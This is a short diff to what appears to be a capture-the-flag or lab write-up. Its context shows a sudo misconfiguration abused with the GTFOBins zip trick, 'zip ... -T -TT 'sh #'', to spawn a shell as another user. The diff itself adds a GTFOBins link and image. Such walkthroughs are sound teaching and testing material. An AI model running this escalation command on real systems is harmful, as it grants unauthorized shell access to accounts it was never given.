@@ -408,12 +408,17 @@ User wileec may run the following commands on Securus:
 <code>snickers</code></p>
 
 
-
 ```bash
 $ TF=$(mktemp -u)
 $ sudo -u jsmith zip $TF /etc/hosts -T -TT 'sh #'
   adding: etc/hosts (deflated 32%)
 ```
+
+<br>
+
+<p align="center">GTFOBins ../<code>zip</code><br><img width="250px" src="https://github.com/user-attachments/assets/411f4b4d-adff-4879-9eb7-f197bcf97528"><br>//gtfobins.github.io/gtfobins/zip/</p>
+
+<br>
 
 ```bash
 $ id
